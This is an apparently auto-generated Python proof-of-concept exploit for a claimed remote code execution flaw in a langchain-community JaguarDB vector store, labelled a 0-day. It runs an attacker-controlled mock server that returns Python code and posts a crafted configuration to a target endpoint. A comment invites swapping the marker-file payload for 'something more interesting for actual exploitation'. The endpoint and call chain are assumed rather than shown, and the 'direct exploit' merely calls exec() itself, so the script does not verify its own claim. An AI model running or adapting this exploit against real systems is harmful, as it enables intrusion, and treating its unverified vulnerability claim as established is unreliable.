#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: worker
# Auto-generated — run with: python3 rce_sink_function_worker_python_worker_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langchain-community-only

Vulnerability: Remote Code Execution via Python exec() in worker()
CVE: N/A (0-day)
Affected: langchain-community-only (/tmp/langchain-community-only)

Attack Vector:
1. The JaguarDB vector store's run() method sends a query to an external JaguarDB server
2. The response from the server is passed directly to worker() which executes it via exec()
3. An attacker who can control the JaguarDB server response (MITM, compromised server, 
   or by injecting malicious data into the database) can achieve RCE

This PoC demonstrates the vulnerability by:
- Setting up a mock JaguarDB server that returns malicious Python code
- Triggering the vulnerable code path through the vector store API
- Executing a benign payload to prove RCE

Requirements: Python 3.6+, no external dependencies beyond stdlib
"""

import json
import sys
import os
import time
import threading
import socket
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from typing import Optional, Dict, Any, List

# ============================================================================
# Configuration - Modify these as needed
# ============================================================================

# The target URL where the vulnerable langchain application is running
TARGET_URL = "http://localhost:8000"

# Port for our mock JaguarDB server (attacker-controlled)
MOCK_SERVER_HOST = "0.0.0.0"
MOCK_SERVER_PORT = 8888

# Benign payload to demonstrate RCE - creates a marker file
# Change this to something more interesting for actual exploitation
BENIGN_PAYLOAD = """
import os
os.system('echo "PWNED" > /tmp/poc_success.txt')
result = "RCE_SUCCESS"
"""

# ============================================================================
# Mock JaguarDB Server - Simulates an attacker-controlled database server
# ============================================================================

class MockJaguarHandler(BaseHTTPRequestHandler):
    """HTTP handler that mimics a JaguarDB server and returns malicious payload"""
    
    def do_POST(self):
        """Handle POST requests - return malicious Python code as response"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b''
        
        print(f"[*] Mock server received POST to {self.path}")
        print(f"[*] Request body: {body.decode('utf-8', errors='replace')[:200]}")
        
        # Return the malicious payload as the response
        # This simulates an attacker-controlled JaguarDB server response
        response = BENIGN_PAYLOAD.encode('utf-8')
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(response)))
        self.end_headers()
        self.wfile.write(response)
        print(f"[*] Sent malicious payload ({len(response)} bytes)")
    
    def do_GET(self):
        """Handle GET requests similarly"""
        self.do_POST()
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def start_mock_server() -> HTTPServer:
    """Start the mock JaguarDB server in a background thread"""
    server = HTTPServer((MOCK_SERVER_HOST, MOCK_SERVER_PORT), MockJaguarHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Mock JaguarDB server started on {MOCK_SERVER_HOST}:{MOCK_SERVER_PORT}")
    return server


# ============================================================================
# Exploit Trigger - Simulates the vulnerable code path
# ============================================================================

def trigger_vulnerability(target_url: str, mock_server_url: str) -> Optional[str]:
    """
    Trigger the RCE vulnerability by sending a request that causes the 
    langchain application to query our malicious JaguarDB server.
    
    The call chain is:
    from_documents -> from_texts -> afrom_texts -> aadd_texts -> add_texts 
    -> _prep_docs -> embed_documents -> run -> worker (exec)
    
    We need to craft a request that makes the application:
    1. Use our mock JaguarDB server as the backend
    2. Send a query that returns our malicious payload
    3. Execute the payload via exec()
    """
    
    # The payload that will be sent to the JaguarDB server
    # This is the query that triggers the vulnerable code path
    query_payload = {
        "action": "embed",
        "texts": ["test document"],
        "collection": "test_collection"
    }
    
    # Construct the full URL for the vulnerable endpoint
    # This assumes the application exposes an API endpoint that uses JaguarDB
    endpoint = f"{target_url}/api/v1/trigger"
    
    # Prepare the request with the malicious configuration
    # We're telling the application to use our mock server as the JaguarDB backend
    malicious_config = {
        "documents": ["test document"],
        "embedding": {
            "type": "jaguar",
            "url": mock_server_url,
            "token": "attacker_token"
        },
        "collection": "test_collection"
    }
    
    print(f"[*] Sending exploit request to {endpoint}")
    print(f"[*] Using malicious config: {json.dumps(malicious_config, indent=2)}")
    
    try:
        # Use urllib to send the request (stdlib only)
        import urllib.request
        import urllib.error
        
        req_data = json.dumps(malicious_config).encode('utf-8')
        req = urllib.request.Request(
            endpoint,
            data=req_data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            result = response.read().decode('utf-8')
            print(f"[*] Response: {result[:500]}")
            return result
            
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[!] Response body: {e.read().decode('utf-8', errors='replace')[:500]}")
        return None
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None


# ============================================================================
# Direct Exploit - Simulates the vulnerable code path locally
# ============================================================================

def direct_exploit():
    """
    Directly simulate the vulnerable code path to demonstrate RCE.
    This bypasses the need for a running application and shows the actual
    vulnerability in the worker() function.
    """
    print("\n[*] Demonstrating direct RCE via worker() function...")
    
    # Simulate what happens in the vulnerable code path
    # The 'command' parameter comes from the JaguarDB server response
    malicious_command = BENIGN_PAYLOAD
    
    print(f"[*] Malicious command to execute:\n{malicious_command}")
    
    # This is exactly what worker() does - exec() with no sanitization
    import sys
    from io import StringIO
    
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()
    
    try:
        # This is the vulnerable exec() call
        exec(malicious_command, {}, {})
        sys.stdout = old_stdout
        output = mystdout.getvalue()
        print(f"[+] Command executed successfully!")
        print(f"[+] Output: {output}")
        
        # Check if our marker file was created
        if os.path.exists('/tmp/poc_success.txt'):
            with open('/tmp/poc_success.txt', 'r') as f:
                content = f.read().strip()
            print(f"[+] RCE confirmed! Marker file contains: {content}")
            # Clean up
            os.remove('/tmp/poc_success.txt')
        else:
            print("[!] Marker file not found - RCE may have failed")
            
    except Exception as e:
        sys.stdout = old_stdout
        print(f"[!] Error during exec: {e}")
        return False
    
    return True


# ============================================================================
# Main Exploit Logic
# ============================================================================

def main():
    """Main exploit function"""
    print("=" * 60)
    print("LangChain-Community RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Step 1: Start the mock JaguarDB server
    print("[*] Step 1: Starting mock JaguarDB server...")
    mock_server = start_mock_server()
    mock_server_url = f"http://{MOCK_SERVER_HOST}:{MOCK_SERVER_PORT}"
    
    try:
        # Step 2: Try to trigger the vulnerability through the application
        print("\n[*] Step 2: Attempting to trigger RCE through application...")
        print("[*] Note: This requires a running instance of the vulnerable application")
        print(f"[*] Target: {TARGET_URL}")
        print(f"[*] Mock server: {mock_server_url}")
        
        result = trigger_vulnerability(TARGET_URL, mock_server_url)
        
        if result:
            print(f"\n[+] Application responded! Check for RCE indicators.")
        else:
            print("\n[!] Could not reach the application. Trying direct exploit...")
        
        # Step 3: Demonstrate the vulnerability directly
        print("\n[*] Step 3: Demonstrating direct RCE via worker()...")
        success = direct_exploit()
        
        if success:
            print("\n[+] VULNERABILITY CONFIRMED: Remote Code Execution via exec()")
            print("[+] The worker() function in python.py executes arbitrary Python code")
            print("[+] without any sanitization when processing JaguarDB responses.")
        else:
            print("\n[!] Direct exploit failed - unexpected error")
            
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
    finally:
        # Clean up
        mock_server.shutdown()
        print("\n[*] Mock server stopped")
    
    print("\n" + "=" * 60)
    print("Exploit complete")
    print("=" * 60)


if __name__ == "__main__":
    main()
